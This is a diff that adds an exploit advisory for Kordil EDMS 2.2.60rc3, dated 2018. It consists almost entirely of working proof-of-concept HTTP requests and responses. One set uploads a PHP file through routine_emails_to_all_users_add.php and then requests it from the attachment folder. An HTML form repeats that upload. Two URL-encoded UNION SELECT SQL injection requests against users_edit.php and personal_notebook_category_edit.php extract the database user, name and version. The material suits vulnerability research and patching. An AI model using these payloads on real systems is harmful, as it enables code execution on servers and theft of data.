@@ -1,0 +1,153 @@
+# Exploit Title: Kordil EDMS 2.2.60rc3 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-11-13
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.kordil.net/
+# Software Link: https://vorboss.dl.sourceforge.net/project/kordiledms/Kordil%20EDMS%20v2.2.60rc3/kordil_edms_installer.exe
+# Version: 2.2.60rc3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# Users...
+# 1) 
+# http://localhost/[PATH]/routine_emails_to_all_users_add.php
+# 
+POST /[PATH]/routine_emails_to_all_users_add.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=187947eb3de6ad8f5541f2c8d8e94225
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------114917121519378418451544589507
+Content-Length: 973
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="add_fd1"
+admin
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="add_fd2"
+Efe
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="add_fd3"
+2018-11-13 15:04:48
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="upload_fd4"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="add_fd5"
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="act"
+n
+-----------------------------114917121519378418451544589507
+Content-Disposition: form-data; name="QS_Submit"
+Add
+-----------------------------114917121519378418451544589507--
+HTTP/1.1 302 Found
+Date: Tue, 13 Nov 2018 12:15:22 GMT
+Server: Apache/2.2.11 (Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9
+X-Powered-By: PHP/5.2.9
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: ./routine_emails_to_all_users.php?
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+GET /PATH/email_attachment/admin-13.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/routine_emails_to_all_users.php?
+Cookie: PHPSESSID=187947eb3de6ad8f5541f2c8d8e94225
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 13 Nov 2018 12:15:30 GMT
+Server: Apache/2.2.11 (Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9
+X-Powered-By: PHP/5.2.9
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/routine_emails_to_all_users_add.php
+# 
+# http://localhost/[PATH]/email_attachment//[FILE]
+# 
+<html>
+<body>
+<form name="qs_add_form" method="post" action="http://localhost/[PATH]/routine_emails_to_all_users_add.php" enctype="multipart/form-data">
+<input type="hidden" name="add_fd1" value="admin">
+<input type="text" name="add_fd2" value="Efe">
+<input type="hidden" name="add_fd3" value=" 2018-11-13 15:04:48">
+<input type="file" name="upload_fd4" id="File">
+<input type="text" name="add_fd5" value="" hidden="true">
+<input type="hidden" name="act" value="n">
+<input type="submit" name="QS_Submit" value="Add">
+</form>
+</body>
+</html>
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/users_edit.php?currentrow_fd0=[SQL]
+#
+GET /PATH/users_edit.php?currentrow_fd0=%2d%31%20%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%2c%32%37%2c%32%38%2c%32%39%2c%33%30%2c%33%31%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=d015a96da04d6dae8233a68bb35fb5d9
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Tue, 13 Nov 2018 12:21:09 GMT
+Server: Apache/2.2.11 (Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9
+X-Powered-By: PHP/5.2.9
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+# POC: 
+# 4)
+# http://localhost/[PATH]/users_edit.php?currentrow_fd0=[SQL]
+#
+GET /PATH/personal_notebook_category_edit.php?currentrow_fd0=%2d%31%30%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%32%2c%33%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=d015a96da04d6dae8233a68bb35fb5d9
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Tue, 13 Nov 2018 12:22:49 GMT
+Server: Apache/2.2.11 (Win32) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8i PHP/5.2.9
+X-Powered-By: PHP/5.2.9
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
